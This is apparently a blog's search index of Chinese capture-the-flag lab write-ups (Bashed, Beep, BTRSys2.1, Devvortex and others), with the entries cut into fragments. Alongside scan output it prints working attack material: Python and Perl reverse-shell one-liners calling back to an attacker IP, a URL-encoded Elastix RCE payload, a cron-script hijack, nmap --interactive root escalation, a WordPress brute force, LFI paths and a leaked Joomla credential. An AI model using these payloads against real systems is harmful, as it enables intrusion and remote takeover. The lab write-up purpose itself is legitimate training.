[{"categories":["靶场"],"content":" ┌──(root㉿kali)-[~/桌面/vpn] └─# nmap -sS -sV -A --min-rate 5000 -p- 192.168.213.94 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 13:33 CST Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 50.00% done; ETC: 13:33 (0:00:06 remaining) Nmap scan report for 192.168.213.94 Host is up (0.21s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 6eceaacc02dea5a3585dda2bef5407f9 (RSA) | 256 9d3fdf167ae15958844ae3298f44878d (ECDSA) |_ 256 87b56ff82181d33b43d04081c0e36989 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Assertion No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=5/17%OT=22%CT=1%CU=30953%PV=Y%DS=4%DC=T%G=Y%TM=6464675 OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%II=I%TS=A)SEQ(SP=1 OS:06%GCD=1%ISR=108%TI=Z%TS=A)OPS(O1=M551ST11NW7%O2=M551ST11NW7%O3=M551NNT1 OS:1NW7%O4=M551ST11NW7%O5=M551ST11NW7%O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE OS:88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q= OS:)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=16 OS:4%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=ABD0%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 4 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 143/tcp) HOP RTT ADDRESS 1 212.35 ms 192.168.45.1 2 212.39 ms 192.168.45.254 3 212.64 ms 192.168.251.1 4 212.77 ms 192.168.213.94 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 50.88 seconds ┌──(root㉿kali)-[~/桌面/vpn] └─# gobuster dir -u http://192.168.213.94/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -r -x php,txt,log,conf =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.213.94/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt,log,conf [+] Follow Redirect: true [+] Expanded: true [+] Timeout: 10s =============================================================== 2023/05/17 13:34:16 Starting gobuster in directory enumeration mode =============================================================== http://192.168.213.94/.php (Status: 403) [Size: 279] http://192.168.213.94/index.php (Status: 200) [Size: 36592] http://192.168.213.94/contact.php (Status: 200) [Size: 11556] http://192.168.213.94/about.php (Status: 200) [Size: 20735] http://192.168.213.94/blog.php (Status: 200) [Size: 15274] http://192.168.213.94/img (Status: 200) [Size: 6721] http://192.168.213.94/gallery.php (Status: 200) [Size: 17070] http://192.168.213.94/pages (Status: 200) [Size: 1959] http://192.168.213.94/css (Status: 200) [Size: 2425] http://192.168.213.94/schedule.php (Status: 200) [Size: 23805] http://192.168.213.94/js (Status: 200) [Size: 2694] http://192.168.213.94/fonts (Status: 200) [Size: 2951] http://192.168.213.94/Source (Status: 200) [Size: 2543] 查了下walkthrough，有一个本地文件包含漏洞的url http://192.168.213.94/index.php?page= 但是我猜测包含函数不是include(),require()等常规的文件包含函数，不能直接给参数page传参../../../../etc/passwd，看了下walkthrough PHP assertions Going from the machine name and the php file extensions, we can guess that the machine is about php assertions. By using Google to search for ways to bypass php assertions, we find similar challenges and we get some suggestions to try. After a couple of tries, we find that the following payload works wonders: page=' and die(s","date":"2023-12-07","objectID":"/assertion1/:0:0","tags":["靶场"],"title":"assertion1","uri":"/assertion1/"},{"categories":["靶场"],"content":"端口扫描 nmap -vv -sV -sT -A -T 4 10.129.208.65 PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD |_http-title: Arrexel's Development Site |_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870 259/tcp filtered esro-gen no-response 1417/tcp filtered timbuktu-srv1 no-response 5004/tcp filtered avt-profile-1 no-response 9111/tcp filtered DragonIDSConsole no-response ","date":"2023-12-07","objectID":"/bashed/:1:0","tags":["靶场"],"title":"bashed","uri":"/bashed/"},{"categories":["靶场"],"content":"访问下80端口 ","date":"2023-12-07","objectID":"/bashed/:1:1","tags":["靶场"],"title":"bashed","uri":"/bashed/"},{"categories":["靶场"],"content":"目录探测 gobuster dir --url http://10.129.208.65 -w /usr/share/wordlists/dirb/small.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.129.208.65 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/05/01 14:29:51 Starting gobuster in directory enumeration mode =============================================================== /css (Status: 301) [Size: 312] [--\u003e http://10.129.208.65/css/] /dev (Status: 301) [Size: 312] [--\u003e http://10.129.208.65/dev/] /images (Status: 301) [Size: 315] [--\u003e http://10.129.208.65/images/] /js (Status: 301) [Size: 311] [--\u003e http://10.129.208.65/js/] /php (Status: 301) [Size: 312] [--\u003e http://10.129.208.65/php/] /uploads (Status: 301) [Size: 316] [--\u003e http://10.129.208.65/uploads/] Progress: 959 / 960 (99.90%) =============================================================== 2023/05/01 14:30:35 Finished =============================================================== ","date":"2023-12-07","objectID":"/bashed/:2:0","tags":["靶场"],"title":"bashed","uri":"/bashed/"},{"categories":["靶场"],"content":"访问下/dev ","date":"2023-12-07","objectID":"/bashed/:2:1","tags":["靶场"],"title":"bashed","uri":"/bashed/"},{"categories":["靶场"],"content":"获得了user的flag，尝试进一步提权到root ","date":"2023-12-07","objectID":"/bashed/:2:2","tags":["靶场"],"title":"bashed","uri":"/bashed/"},{"categories":["靶场"],"content":"权限提升 ","date":"2023-12-07","objectID":"/bashed/:3:0","tags":["靶场"],"title":"bashed","uri":"/bashed/"},{"categories":["靶场"],"content":"补充一点关于sudoers文件的知识 规则讲解 sudoers文件的数据，每一行分为五个部分，我们用ABCDE来表示。 一般情况下是: A B = {©} {D} E 且C与D是可以省略的，我们用大括号扩起来方便大家注意到，但真正书写命令的时候不需要打括号。 第一个部分A代表授权使用sudo的用户或者组 第二部分B代表允许授权用户在哪些主机上使用这些权利 第三部分C代表允许被授权用户提权到什么用户什么组级别的权限，如果省略就代表允许提权到任意用户级别。 第四部分D代表当被授权用户是否需要输入自身密码来使用特权，若省略这代表需要输入密码 第五部分E代表允许执行的命令，如果是all就代表允许执行所有命令 第一部分A A表示的是哪个用户或者哪个用户组拥有执行sudo的权限，当A前面带有%的时候，代表的是用户组。 例如 admin all = (all) all 这行命令表示admin用户可以登陆到任意主机，并且可以提权到任意用户，并且可以执行任意命令，但需要输入用户admin到密码。 如果在admin前面加上%就会使得admin组的所有用户拥有这些权限，使用的时候需要输入对应用户的密码。而这一行命令典型的就是省略了第四个属性，也就是D，D代表的是密码。 第二部分B B代表用户可以在哪些电脑上使用这些特权，这一个字段一般是主机名。 例如：jack mycomputer=/usr/sbin/reboot,/usr/sbin/shutdown 上面这行表示jack可以在mycomputer上提权到root用户，并且允许以root权限使用reboot与shutdown命令，但是需要输入jack的密码才可以。 第三部分C 代表的是允许提权到的目标用户与组，例如(root:root)的意思就是提权到root用户root组，也就是当前用户使用sudo命令的时候会获得与root用户root组相同的权限。 当C参数隐藏的时候，默认提权权限就是root。如果是all的话就是指的可以提权到任意用户任意权限。 第四部分D 这个参数是用来定义当目标用户使用sudo的时候，是否需要输入用户密码。如果为NOPASSWD:则表示不需要，否则为需要,注意字母后面带了冒号。 第五部分E 表示允许执行的命令。 ","date":"2023-12-07","objectID":"/bashed/:3:1","tags":["靶场"],"title":"bashed","uri":"/bashed/"},{"categories":["靶场"],"content":"先把shell转发到kali机器上，直接在phpbash里运行python反弹shell的命令 python -c \"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.9',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\" ","date":"2023-12-07","objectID":"/bashed/:3:2","tags":["靶场"],"title":"bashed","uri":"/bashed/"},{"categories":["靶场"],"content":"后面的步骤需要耐心观察+运气了 cd /script ls -la ","date":"2023-12-07","objectID":"/bashed/:3:3","tags":["靶场"],"title":"bashed","uri":"/bashed/"},{"categories":["靶场"],"content":"多次使用ls -la可以看到test.txt的最后修改时间，每隔一段时间就会更新。并且test.txt的文件所有者是root，可能是root用户的定时任务每隔一段时间运行test.py生成而来的。这里如果对test.txt的最后一次修改时间观察不仔细，很容易漏掉这个细节，这也是我踩的一个坑。 echo 'import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.9',12345));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);' \u003e test.py ","date":"2023-12-07","objectID":"/bashed/:3:4","tags":["靶场"],"title":"bashed","uri":"/bashed/"},{"categories":["靶场"],"content":"再次将反弹shell的命令写test.py，同时监听12345端口，看看等下能不能收到shell。 ","date":"2023-12-07","objectID":"/bashed/:3:5","tags":["靶场"],"title":"bashed","uri":"/bashed/"},{"categories":["靶场"],"content":"看了下计划任务，果然定时执行test.py文件。 ","date":"2023-12-07","objectID":"/bashed/:3:6","tags":["靶场"],"title":"bashed","uri":"/bashed/"},{"categories":["靶场"],"content":"信息收集 nmap -vv -sV -sT -T 4 10.129.1.226 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 4.3 (protocol 2.0) 25/tcp open smtp? syn-ack 80/tcp open http syn-ack Apache httpd 2.2.3 110/tcp open pop3? syn-ack 111/tcp open rpcbind syn-ack 2 (RPC #100000) 143/tcp open imap? syn-ack 443/tcp open ssl/https? syn-ack 993/tcp open imaps? syn-ack 995/tcp open pop3s? syn-ack 3306/tcp open mysql? syn-ack 4445/tcp open upnotifyp? syn-ack 10000/tcp open http syn-ack MiniServ 1.570 (Webmin httpd) Service Info: Host: 127.0.0.1 访问80端口，会被重定向到443端口，使用了低版本的TLS协议。在火狐里输入about:config,搜索tls.version,将tls最小的支持版本改为TLS V1 后续就可以无视风险正常访问了😆 ","date":"2023-12-07","objectID":"/beep/:1:0","tags":["靶场"],"title":"beep","uri":"/beep/"},{"categories":["靶场"],"content":"漏洞利用 这里查询了一下elastix的漏洞 searchsploit elastix 有个RCE,贴上exp https://10.129.1.226/recordings/misc/callme_page.php?action=c\u0026callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.16.9%3a1234%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A 这里需要注意，必须按照payload的格式对一些特殊符号url编码，第一次利用的时候url decode成明文，发现并没有收到shell。 拿到shell后利用python创建个交互式终端 python -c 'import pty; pty.spawn (\"/bin/bash\")' ","date":"2023-12-07","objectID":"/beep/:2:0","tags":["靶场"],"title":"beep","uri":"/beep/"},{"categories":["靶场"],"content":"权限提升 sudo -l 这里卡住了，查了下可以利用nmap的—interactive提权 sudo nmap --interactive nmap\u003e !python -c \"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.9',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\" ┌──(root💀Chinchin)-[/usr/…/modules/exploits/unix/http] └─# nc -lvnp 1234 listening on [any] 1234 ... connect to [10.10.16.9] from (UNKNOWN) [10.129.1.226] 33372 bash: no job control in this shell bash-3.2# whoami root ","date":"2023-12-07","objectID":"/beep/:3:0","tags":["靶场"],"title":"beep","uri":"/beep/"},{"categories":["靶场"],"content":" ┌──(root㉿kali)-[~] └─# nmap -sS -sV -A --min-rate 5000 -p- 192.168.213.50 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-18 10:40 CST Nmap scan report for 192.168.213.50 Host is up (0.18s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:192.168.45.156 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status |_ftp-anon: Anonymous FTP login allowed (FTP code 230) 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 08eee3ff3120876c12e71caac4e754f2 (RSA) | 256 ade11c7de78676be9aa8bdb968927787 (ECDSA) |_ 256 0ce1eb060c5cb5cc1bd1fa5606223167 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn't have a title (text/html). | http-robots.txt: 1 disallowed entry |_Hackers |_http-server-header: Apache/2.4.18 (Ubuntu) Aggressive OS guesses: Linux 3.11 - 4.1 (91%), Linux 4.4 (91%), Linux 3.16 (89%), Linux 3.13 (89%), Linux 3.10 - 3.16 (88%), Linux 3.10 - 3.12 (87%), Linux 2.6.32 (87%), Linux 3.2 - 3.8 (87%), Linux 3.8 (87%), WatchGuard Fireware 11.8 (87%) No exact OS matches for host (test conditions non-ideal). Network Distance: 4 hops Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 443/tcp) HOP RTT ADDRESS 1 194.93 ms 192.168.45.1 2 194.99 ms 192.168.45.254 3 195.65 ms 192.168.251.1 4 195.80 ms 192.168.213.50 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 62.28 seconds CMS使用了wordpress，枚举账户 wpscan --url http://192.168.213.50/wordpress --enumerate u [+] btrisk | Found By: Author Posts - Display Name (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Author Id Brute Forcing - Author Pattern (Aggressive Detection) [+] admin | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) 试下爆破密码 [+] Performing password attack on Xmlrpc Multicall against 1 user/s [SUCCESS] - admin / admin All Found Progress Time: 00:00:46 \u003c \u003e (40 / 28688) 0.13% ETA: ??:??:?? 登陆进去后发现plugin Mail Masta 进行LFI漏洞利用读取flag,根据machine名猜测用户名为btrisk http://192.168.213.50/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/home/btrisk/local.txt 正确的利用方式是wordpress，通过appearance–»editor–\u003eadd reverse-shell.php,添加后访问http://host/wordpress/wp-content/themes/twentyfourteen/reverse-shell.php 获取shell data@ubuntu:/var/www/html$ ./linpeas.sh ./linpeas.sh ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄ ▄▄ ▄▄▄ ▄▄▄▄▄ ▄▄▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄ ▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄ ▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄ ▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ linpeas v3.1.5 - Safe OSCP by carlospolop ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission. Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist LEGEND: RED/YELLOW: 95% a PE","date":"2023-12-07","objectID":"/btrsys2.1/:0:0","tags":["靶场"],"title":"BTRSys2.1","uri":"/btrsys2.1/"},{"categories":["靶场"],"content":" nmap -sS -sV -p- --min-rate 5000 10.129.227.211 ┌──(root㉿kali)-[~/桌面/vpn] └─# netstat -antlp Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 192.168.199.128:58988 209.58.165.155:443 ESTABLISHED 15050/openvpn ┌──(root㉿kali)-[~/桌面/vpn] └─# nmap -sS -sV -p- --min-rate 5000 10.129.227.211 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 09:53 CST Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 7.72% done; ETC: 09:53 (0:00:12 remaining) Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 13.12% done; ETC: 09:53 (0:00:13 remaining) Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 83.33% done; ETC: 09:53 (0:00:00 remaining) Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 83.33% done; ETC: 09:53 (0:00:00 remaining) Nmap scan report for 10.129.227.211 Host is up (0.19s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) 53/tcp open domain ISC BIND 9.10.3-P4 (Ubuntu Linux) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 24.95 seconds ┌──(root㉿kali)-[~/桌面/vpn] └─# nmap -sS -sV -p- -V --min-rate 5000 10.129.227.211 Nmap version 7.93 ( https://nmap.org ) Platform: x86_64-pc-linux-gnu Compiled with: liblua-5.3.6 openssl-3.0.8 libssh2-1.10.0 libz-1.2.13 libpcre-8.39 nmap-libpcap-1.7.3 nmap-libdnet-1.12 ipv6 Compiled without: Available nsock engines: epoll poll select ┌──(root㉿kali)-[~/桌面/vpn] └─# nmap -sS -sV -p- -A --min-rate 5000 10.129.227.211 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 09:55 CST Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan Parallel DNS resolution of 1 host. Timing: About 0.00% done Stats: 0:00:02 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan Parallel DNS resolution of 1 host. Timing: About 0.00% done Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 1.76% done; ETC: 09:55 (0:00:00 remaining) Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 9.13% done; ETC: 09:55 (0:00:10 remaining) Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 12.07% done; ETC: 09:55 (0:00:15 remaining) Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 14.58% done; ETC: 09:55 (0:00:12 remaining) Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 16.45% done; ETC: 09:55 (0:00:10 remaining) Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 20.15% done; ETC: 09:55 (0:00:12 remaining) Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 20.57% done; ETC: 09:55 (0:00:12 remaining) Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 20.97% done; ETC: 09:55 (0:00:11 remaining) Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 21.28% done; ETC: 09:55 (0:00:11 remaining) Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 21.71% done; ETC: 09:55 (0:00:11 remaining) Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 22.10% done; ETC: 09:55 (0:00:11 remaining) Stats: ","date":"2023-12-07","objectID":"/cronos/:0:0","tags":["靶场"],"title":"cronos","uri":"/cronos/"},{"categories":["靶场"],"content":" nmap -sS -A -sV -sC -p- --min-rate 5000 -T4 10.129.171.193 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-27 16:38 CST Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 2.92% done; ETC: 16:39 (0:00:33 remaining) Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 3.65% done; ETC: 16:38 (0:00:26 remaining) Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 6.22% done; ETC: 16:39 (0:00:30 remaining) Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 6.99% done; ETC: 16:38 (0:00:27 remaining) Warning: 10.129.171.193 giving up on port because retransmission cap hit (6). Nmap scan report for 10.129.171.193 Host is up (0.49s latency). Not shown: 50783 filtered tcp ports (no-response), 14750 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://devvortex.htb/ Aggressive OS guesses: Linux 5.0 (95%), Linux 5.0 - 5.4 (95%), HP P2000 G3 NAS device (93%), Linux 4.15 - 5.8 (93%), Linux 5.3 - 5.4 (93%), Linux 2.6.32 (92%), Linux 2.6.32 - 3.1 (92%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (92%), Linux 3.7 (92%), Linux 5.0 - 5.5 (92%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 5900/tcp) HOP RTT ADDRESS 1 607.91 ms 10.10.14.1 2 608.43 ms 10.129.171.193 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 136.23 seconds 将扫描出来的虚拟域名添加到hosts文件中 翻看了80端口没有发现什么可以和服务端交互的功能 尝试爆破子域名 wfuzz -c -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -u \"http://devvortex.htb/\" -H \"Host: FUZZ.devvortex.htb\" --hl 7 发现存在dev.devvortex.htb子域名，推测这个域名又是一个虚拟主机的域名，在hosts文件里修改dev.devvortex.htb与ip地址的映射 扫描下目录 gobuster dir -u http://dev.devvortex.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -r -x asp,cgi,txt,log,conf,cgi-bin,bak,db,git -t 1000 --no-error -b 502 --exclude-length 3653 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://dev.devvortex.htb [+] Method: GET [+] Threads: 1000 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 502 [+] Exclude Length: 3653 [+] User Agent: gobuster/3.6 [+] Extensions: txt,log,bak,git,asp,cgi,conf,cgi-bin,db [+] Follow Redirect: true [+] Expanded: true [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== http://dev.devvortex.htb/images (Status: 200) [Size: 31] http://dev.devvortex.htb/templates (Status: 200) [Size: 31] http://dev.devvortex.htb/home (Status: 200) [Size: 23221] http://dev.devvortex.htb/plugins (Status: 200) [Size: 31] http://dev.devvortex.htb/language (Status: 200) [Size: 31] http://dev.devvortex.htb/components (Status: 200) [Size: 31] http://dev.devvortex.htb/README.txt (Status: 200) [Size: 4942] http://dev.devvortex.htb/cache (Status: 200) [Size: 31] http://dev.devvortex.htb/robots.txt (Status: 200) [Size: 764] 在readme.txt中看到joomla的版本为4.2 在网上找到一个信息泄露的漏洞 poc http://joomla_host/api/index.php/v1/config/application?public=true 拿到joomla用户凭据 lewis:P4ntherg0t1n5r3c0n## 登录后台，修改模板","date":"2023-12-07","objectID":"/devvortex/:0:0","tags":["靶场"],"title":"Devvortex","uri":"/devvortex/"},{"categories":["靶场"],"content":" ┌──(root💀Chinchin)-[~/桌面] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.213.211 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-15 21:50 CST Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 1.66% done; ETC: 21:50 (0:00:00 remaining) Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 3.28% done; ETC: 21:50 (0:00:00 remaining) Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 4.18% done; ETC: 21:50 (0:00:00 remaining) Nmap scan report for 192.168.213.211 Host is up (0.29s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | 